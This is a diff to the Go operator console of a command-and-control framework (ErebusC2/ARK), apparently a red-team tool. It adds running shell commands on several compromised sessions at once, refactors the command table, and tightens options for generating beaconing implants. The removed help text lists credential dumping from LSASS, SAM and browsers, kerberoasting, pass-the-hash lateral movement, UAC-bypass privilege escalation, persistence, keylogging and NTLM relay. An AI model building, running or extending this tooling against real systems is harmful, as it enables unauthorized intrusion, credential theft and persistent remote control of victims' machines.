@@ -9,6 +9,7 @@ import (
 	"time"
 
 	pb "github.com/KKingZero/ARK/pkg/pb"
+	"github.com/KKingZero/ARK/server/builder"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -18,6 +19,9 @@ type Commands struct {
 	client         pb.ErebusC2Client
 	approverClient pb.ErebusC2Client
 	sessionID      string // active session
+	sessionIDs     []string
+	// oneShot is set only by ark op. The REPL leaves it false.
+	oneShot bool
 }
 
 func NewCommands(client pb.ErebusC2Client, approverClient pb.ErebusC2Client) *Commands {
@@ -32,54 +36,14 @@ func (c *Commands) approvalClient() pb.ErebusC2Client {
 }
 
 func (c *Commands) Handlers() map[string]CommandHandler {
-	return map[string]CommandHandler{
-		"sessions":        c.cmdSessions,
-		"use":             c.cmdUse,
-		"shell":           c.cmdShell,
-		"upload":          c.cmdUpload,
-		"download":        c.cmdDownload,
-		"ps":              c.cmdPS,
-		"kill":            c.cmdKill,
-		"ifconfig":        c.cmdIfconfig,
-		"portscan":        c.cmdPortscan,
-		"sleep":           c.cmdSleep,
-		"generate":        c.cmdGenerate,
-		"register-secret": c.cmdRegisterSecret,
-		"tasks":           c.cmdTasks,
-		"result":          c.cmdResult,
-		"loot":            c.cmdLoot,
-		"events":          c.cmdEvents,
-		"listeners":       c.cmdListeners,
-		"approve":         c.cmdApprove,
-		"deny":            c.cmdDeny,
-		"pending":         c.cmdPending,
-		"screenshot":      c.cmdScreenshot,
-		"keylog":          c.cmdKeylog,
-		"inject":          c.cmdInject,
-		"ldap-enum":       c.cmdLDAPEnum,
-		"kerberos":        c.cmdKerberos,
-		"kerberoast":      c.cmdKerberoast,
-		"asreproast":      c.cmdASREPRoast,
-		"creds-dump":      c.cmdCredsDump,
-		"lateral":         c.cmdLateral,
-		"smb":             c.cmdSMB,
-		"persist":         c.cmdPersist,
-		"privesc":         c.cmdPrivesc,
-		"cloud":           c.cmdCloud,
-		"mqtt":            c.cmdMQTT,
-		"relay":           c.cmdRelay,
-		"ldap":            c.cmdHostLDAP,
-		"ad":              c.cmdHostAD,
-		"host-smb":        c.cmdHostSMB,
-		"inbound":         c.cmdInbound,
-		"adcs":            c.cmdADCS,
-		"socks":           c.cmdSocks,
-		"approve-all":     c.cmdApproveAll,
-		"replay-clear":    c.cmdReplayClear,
-		"clear-replay":    c.cmdReplayClear,
-		"exit":            c.cmdExit,
-		"help":            c.cmdHelp,
+	handlers := map[string]CommandHandler{}
+	for _, d := range commandDescriptors() {
+		desc := d
+		handlers[desc.Name] = func(args []string) error {
+			return desc.Handler(c, args)
+		}
 	}
+	return handlers
 }
 
 // ctx returns a context with timeout. The cancel function is called internally
@@ -88,9 +52,33 @@ func (c *Commands) ctx() (context.Context, context.CancelFunc) {
 	return context.WithTimeout(context.Background(), 60*time.Second)
 }
 
+func (c *Commands) taskCtx() (context.Context, context.CancelFunc) {
+	return context.WithTimeout(context.Background(), 31*time.Minute)
+}
+
 func (c *Commands) requireSession() error {
-	if c.sessionID == "" {
+	if len(c.activeSessions()) == 0 {
 		return fmt.Errorf("no active session - use 'use <session-id>'")
+	}
+	return nil
+}
+
+func (c *Commands) requireSingleSession() error {
+	if err := c.requireSession(); err != nil {
+		return err
+	}
+	if len(c.activeSessions()) > 1 {
+		return fmt.Errorf("multiple sessions selected; this command supports one session")
+	}
+	return nil
+}
+
+func (c *Commands) activeSessions() []string {
+	if len(c.sessionIDs) > 0 {
+		return c.sessionIDs
+	}
+	if c.sessionID != "" {
+		return []string{c.sessionID}
 	}
 	return nil
 }
@@ -140,54 +128,114 @@ func (c *Commands) cmdSessions(_ []string) error {
 
 func (c *Commands) cmdUse(args []string) error {
 	if len(args) < 1 {
-		return fmt.Errorf("usage: use <session-id>")
+		return fmt.Errorf("usage: use <session-id|id,id|all|alive>")
 	}
-	c.sessionID = args[0]
-	fmt.Printf("Active session: %s\n", c.sessionID)
+	ids, err := c.resolveSessionSelector(args[0])
+	if err != nil {
+		return err
+	}
+	c.sessionID = ""
+	c.sessionIDs = nil
+	if len(ids) == 1 {
+		c.sessionID = ids[0]
+		fmt.Printf("Active session: %s\n", c.sessionID)
+		return nil
+	}
+	c.sessionIDs = ids
+	fmt.Printf("Active sessions: %s\n", strings.Join(c.sessionIDs, ","))
 	return nil
 }
 
 func (c *Commands) executeTask(taskType pb.TaskType, data []byte, wait bool) (*pb.ExecuteTaskResponse, error) {
-	if err := c.requireSession(); err != nil {
+	if err := c.requireSingleSession(); err != nil {
 		return nil, err
 	}
-	ctx, cancel := c.ctx()
+	return c.executeTaskOnSession(c.activeSessions()[0], taskType, data, wait)
+}
+
+func (c *Commands) executeTaskOnSession(sessionID string, taskType pb.TaskType, data []byte, wait bool) (*pb.ExecuteTaskResponse, error) {
+	ctx, cancel := c.taskCtx()
 	defer cancel()
-	return c.client.ExecuteTask(ctx, &pb.ExecuteTaskRequest{
-		SessionId: c.sessionID,
-		TaskType:  taskType,
-		Data:      data,
-		Wait:      wait,
-		TimeoutMs: 30000,
-	})
+	if !wait || !c.oneShot {
+		return c.client.ExecuteTask(ctx, &pb.ExecuteTaskRequest{
+			SessionId: sessionID,
+			TaskType:  taskType,
+			Data:      data,
+			Wait:      wait,
+			TimeoutMs: 30000,
+		})
+	}
+	return c.executeWait(ctx, sessionID, taskType, data, 30000)
+}
+
+// shellCommandFromArgs joins the shell command. A leading "--" is the
+// documented end-of-flags marker (`ark op shell -- id`). Passing it through
+// makes /bin/sh treat the command string as an option ("Illegal option --").
+func shellCommandFromArgs(args []string) (string, error) {
+	if len(args) > 0 && args[0] == "--" {
+		args = args[1:]
+	}
+	if len(args) == 0 || strings.TrimSpace(strings.Join(args, " ")) == "" {
+		return "", fmt.Errorf("usage: shell <command>")
+	}
+	return strings.Join(args, " "), nil
 }
 
 func (c *Commands) cmdShell(args []string) error {
-	if len(args) < 1 {
-		return fmt.Errorf("usage: shell <command>")
-	}
-	cmd := strings.Join(args, " ")
-	data, _ := proto.Marshal(&pb.ShellTask{Command: cmd})
-
-	resp, err := c.executeTask(pb.TaskType_TASK_SHELL, data, true)
+	cmd, err := shellCommandFromArgs(args)
 	if err != nil {
 		return err
 	}
-	if resp.Result != nil {
-		if resp.Result.Success {
-			result := &pb.ShellResult{}
-			proto.Unmarshal(resp.Result.Data, result)
-			if result.Stdout != "" {
-				fmt.Print(result.Stdout)
-			}
-			if result.Stderr != "" {
-				fmt.Printf("[stderr] %s", result.Stderr)
-			}
-		} else {
-			fmt.Printf("Error: %s\n", resp.Result.Error)
+	data, _ := proto.Marshal(&pb.ShellTask{Command: cmd})
+
+	if err := c.requireSession(); err != nil {
+		return err
+	}
+	for _, sid := range c.activeSessions() {
+		resp, err := c.executeShell(sid, data)
+		if len(c.activeSessions()) > 1 {
+			fmt.Printf("[%s]\n", sid)
+		}
+		if err != nil {
+			fmt.Printf("Error: %v\n", err)
+			continue
+		}
+		printShellResponse(resp)
+		if len(c.activeSessions()) > 1 {
+			fmt.Println()
 		}
 	}
 	return nil
+}
+
+func (c *Commands) executeShell(sessionID string, data []byte) (*pb.ExecuteTaskResponse, error) {
+	ctx, cancel := c.ctx()
+	defer cancel()
+	return c.executeWait(ctx, sessionID, pb.TaskType_TASK_SHELL, data, 30000)
+}
+
+func printShellResponse(resp *pb.ExecuteTaskResponse) {
+	if resp == nil || resp.Result == nil {
+		return
+	}
+	if !resp.Result.Success {
+		fmt.Printf("Error: %s\n", resp.Result.Error)
+		return
+	}
+	result := &pb.ShellResult{}
+	proto.Unmarshal(resp.Result.Data, result)
+	if result.Stdout != "" {
+		fmt.Print(result.Stdout)
+	}
+	if result.Stderr != "" {
+		fmt.Printf("[stderr] %s", result.Stderr)
+	}
+}
+
+func printSessionHeader(sessionID string, multi bool) {
+	if multi {
+		fmt.Printf("[%s]\n", sessionID)
+	}
 }
 
 func (c *Commands) cmdUpload(args []string) error {
@@ -216,19 +264,39 @@ func (c *Commands) cmdDownload(args []string) error {
 }
 
 func (c *Commands) cmdPS(_ []string) error {
-	resp, err := c.executeTask(pb.TaskType_TASK_PROCESS_LIST, nil, true)
-	if err != nil {
+	if err := c.requireSession(); err != nil {
 		return err
 	}
-	if resp.Result != nil && resp.Result.Success {
-		result := &pb.ProcessListResult{}
-		proto.Unmarshal(resp.Result.Data, result)
-		fmt.Printf("%-8s %-8s %-20s %-10s\n", "PID", "PPID", "NAME", "USER")
-		for _, p := range result.Processes {
-			fmt.Printf("%-8d %-8d %-20s %-10s\n", p.Pid, p.Ppid, p.Name, p.User)
+	multi := len(c.activeSessions()) > 1
+	for _, sid := range c.activeSessions() {
+		printSessionHeader(sid, multi)
+		resp, err := c.executeTaskOnSession(sid, pb.TaskType_TASK_PROCESS_LIST, nil, true)
+		if err != nil {
+			fmt.Printf("Error: %v\n", err)
+		} else {
+			printProcessListResponse(resp)
+		}
+		if multi {
+			fmt.Println()
 		}
 	}
 	return nil
+}
+
+func printProcessListResponse(resp *pb.ExecuteTaskResponse) {
+	if resp == nil || resp.Result == nil {
+		return
+	}
+	if !resp.Result.Success {
+		fmt.Printf("Error: %s\n", resp.Result.Error)
+		return
+	}
+	result := &pb.ProcessListResult{}
+	proto.Unmarshal(resp.Result.Data, result)
+	fmt.Printf("%-8s %-8s %-20s %-10s\n", "PID", "PPID", "NAME", "USER")
+	for _, p := range result.Processes {
+		fmt.Printf("%-8d %-8d %-20s %-10s\n", p.Pid, p.Ppid, p.Name, p.User)
+	}
 }
 
 func (c *Commands) cmdKill(args []string) error {
@@ -251,25 +319,45 @@ func (c *Commands) cmdKill(args []string) error {
 }
 
 func (c *Commands) cmdIfconfig(_ []string) error {
-	resp, err := c.executeTask(pb.TaskType_TASK_NET_IFCONFIG, nil, true)
-	if err != nil {
+	if err := c.requireSession(); err != nil {
 		return err
 	}
-	if resp.Result != nil && resp.Result.Success {
-		result := &pb.NetIfconfigResult{}
-		proto.Unmarshal(resp.Result.Data, result)
-		for _, iface := range result.Interfaces {
-			status := "down"
-			if iface.Up {
-				status = "up"
-			}
-			fmt.Printf("%s (%s) MTU=%d %s\n", iface.Name, iface.Mac, iface.Mtu, status)
-			for _, addr := range iface.Addresses {
-				fmt.Printf("  %s\n", addr)
-			}
+	multi := len(c.activeSessions()) > 1
+	for _, sid := range c.activeSessions() {
+		printSessionHeader(sid, multi)
+		resp, err := c.executeTaskOnSession(sid, pb.TaskType_TASK_NET_IFCONFIG, nil, true)
+		if err != nil {
+			fmt.Printf("Error: %v\n", err)
+		} else {
+			printIfconfigResponse(resp)
+		}
+		if multi {
+			fmt.Println()
 		}
 	}
 	return nil
+}
+
+func printIfconfigResponse(resp *pb.ExecuteTaskResponse) {
+	if resp == nil || resp.Result == nil {
+		return
+	}
+	if !resp.Result.Success {
+		fmt.Printf("Error: %s\n", resp.Result.Error)
+		return
+	}
+	result := &pb.NetIfconfigResult{}
+	proto.Unmarshal(resp.Result.Data, result)
+	for _, iface := range result.Interfaces {
+		status := "down"
+		if iface.Up {
+			status = "up"
+		}
+		fmt.Printf("%s (%s) MTU=%d %s\n", iface.Name, iface.Mac, iface.Mtu, status)
+		for _, addr := range iface.Addresses {
+			fmt.Printf("  %s\n", addr)
+		}
+	}
 }
 
 func (c *Commands) cmdPortscan(args []string) error {
@@ -323,11 +411,17 @@ func (c *Commands) cmdSleep(args []string) error {
 	if ms < 100 {
 		return fmt.Errorf("sleep ms must be >= 100 (got %d)", ms)
 	}
+	if ms > maxGenerateSleepMs {
+		return fmt.Errorf("sleep ms must be <= %d (got %d)", maxGenerateSleepMs, ms)
+	}
 	var jitter int32
 	if len(args) > 1 {
 		j, err := strconv.ParseInt(args[1], 10, 32)
 		if err != nil {
 			return fmt.Errorf("invalid jitter: %s", args[1])
+		}
+		if j < 0 || j > 100 {
+			return fmt.Errorf("jitter must be 0-100 (got %d)", j)
 		}
 		jitter = int32(j)
 	}
@@ -350,10 +444,12 @@ type generateOpts struct {
 	help                                  bool
 }
 
+const maxGenerateSleepMs = builder.MaxSleepMs
+
 func parseGenerateArgs(args []string) (generateOpts, error) {
 	g := generateOpts{
-		os: "windows", arch: "amd64", format: "exe",
-		language: "c", transport: "https", sleepMs: 500, jitter: 10,
+		os: builder.DefaultOS, arch: builder.DefaultArch, format: string(builder.DefaultFormat),
+		language: builder.DefaultLanguage, transport: builder.DefaultTransport, sleepMs: builder.DefaultSleepMs, jitter: builder.DefaultJitterPct,
 	}
 	for i := 0; i < len(args); i++ {
 		a := args[i]
@@ -383,7 +479,7 @@ func parseGenerateArgs(args []string) (generateOpts, error) {
 				return g, err
 			}
 			g.format = v
-		case "--sleep", "-sleep":
+		case "--sleep", "-sleep", "--sleep-ms", "--callback-time", "--beacon-ms":
 			v, err := need(a)
 			if err != nil {
 				return g, err
@@ -393,7 +489,7 @@ func parseGenerateArgs(args []string) (generateOpts, error) {
 				return g, fmt.Errorf("invalid --sleep: %s", v)
 			}
 			g.sleepMs = ms
-		case "--jitter", "-jitter":
+		case "--jitter", "-jitter", "--jitter-pct":
 			v, err := need(a)
 			if err != nil {
 				return g, err
@@ -453,7 +549,13 @@ func parseGenerateArgs(args []string) (generateOpts, error) {
 		}
 	}
 	if len(g.callbacks) == 0 {
-		g.callbacks = []string{"https://127.0.0.1:443"}
+		g.callbacks = []string{builder.DefaultCallback}
+	}
+	if g.sleepMs < builder.MinSleepMs || g.sleepMs > maxGenerateSleepMs {
+		return g, fmt.Errorf("--sleep must be %d-%d ms", builder.MinSleepMs, maxGenerateSleepMs)
+	}
+	if g.jitter < builder.MinJitterPct || g.jitter > builder.MaxJitterPct {
+		return g, fmt.Errorf("--jitter must be %d-%d", builder.MinJitterPct, builder.MaxJitterPct)
 	}
 	if g.transport != "https" && g.transport != "dns" {
 		return g, fmt.Errorf("--transport must be https or dns")
@@ -483,8 +585,8 @@ func (c *Commands) cmdGenerate(args []string) error {
   --os windows|linux|darwin   target OS (default windows)
   --arch amd64|arm64          target arch (default amd64)
   --format exe|dll|shellcode  output format (default exe; C = exe only)
-  --sleep ms                  beacon sleep (default 500)
-  --jitter pct                jitter percent (default 10)
+  --sleep ms                  beacon sleep / callback interval (default 500; aliases: --sleep-ms, --callback-time)
+  --jitter pct                jitter percent 0-100 (default 10; alias: --jitter-pct)
   --callback URL              C2 callback (repeatable)
   --language c|go             implant language (default c; Windows PE full / Linux basic peer; go for dll/shellcode)
   --out path                  write binary to path (default ./<filename>)`)
@@ -800,49 +902,9 @@ func (c *Commands) cmdExit(_ []string) error {
 var errExit = fmt.Errorf("exit")
 
 func (c *Commands) cmdHelp(_ []string) error {
-	fmt.Println(`Commands:
-  sessions              - List active sessions
-  use <session-id>      - Select active session
-  shell <command>       - Execute shell command
-  upload <local> <remote> - Upload file
-  download <remote>     - Download file
-  ps                    - List processes
-  kill <pid>            - Kill process
-  ifconfig              - List network interfaces
-  portscan <host> <ports> - TCP port scan
-  sleep <ms> [jitter]   - Set beacon interval
-  generate [opts]       - Build implant (see: generate --help)
-  register-secret <id> <hex> [build_id] - Register PSK for manual implant builds
-  screenshot            - Take screenshot
-  keylog <start|stop|dump> - Keylogger control
-  ldap-enum <type> --domain <d> --dc <dc> - LDAP AD enumeration
-  kerberos skew --dc <host> [--user u] [--pass p] [--max-skew 5m] - Kerberos clock preflight (no session)
-  kerberos with-skew --dc <host> -- <cmd...> - run cmd under libfaketime to match DC clock
-  kerberoast --domain <d> --dc <dc> --user <u> --pass <p>
-  asreproast --domain <d> --dc <dc>
-  creds-dump <lsass|sam|browser|ssh_keys|history|env|files>
-  lateral <wmi|winrm|psexec> <target> <command> [--user u] [--pass p] [--hash h]
-  smb <list_shares|list_dir|download> --host h [--share s] [--path p] [--user u] [--pass p] [--hash h] [--anon]
-  ldap-enum <query_type> --domain d --dc dc [--user u] [--pass p] [--hash h]
-  persist <schtask|registry|service> [--name n] [--path p] [--trigger t]
-  privesc <token|uac_fodhelper|uac_eventvwr> [--pid n] [--command c]
-  mqtt <sub|pub|healthcheck-hijack> ...  - Pre-implant MQTT (no session; see: mqtt help)
-  relay http <start|sessions|get|status> - Pre-implant HTTP NTLM relay (no session)
-  inbound [status|env|drop|through|close|tunnel] - C2 reachability / SOCKS env
-  socks <start|stop> [--port 1080] - reverse SOCKS over the C implant beacon
-  cloud <aws|azure|all> [env|creds|cli|all] - Linux C cloud harvest
-  ldap <bind|enum|dangling> ... - Host-side LDAP (no session; see: ldap help)
-  host-smb <shares|ls|get> ...  - Host-side SMB (no session; implant smb still needs use)
-  ad password ...               - Host-side ForceChangePassword (see: ad help)
-  tasks                 - List session tasks
-  result <task-id>      - Get task result
-  loot                  - List loot
-  events                - Stream events
-  listeners             - List listeners
-  pending               - List pending approvals
-  approve <id>          - Approve operation
-  deny <id> [reason]    - Deny operation
-  exit                  - Exit operator CLI
-  help                  - Show this help`)
+	fmt.Println("Commands:")
+	for _, d := range commandDescriptors() {
+		fmt.Printf("  %-78s - %s\n", d.Usage, d.Help)
+	}
 	return nil
 }
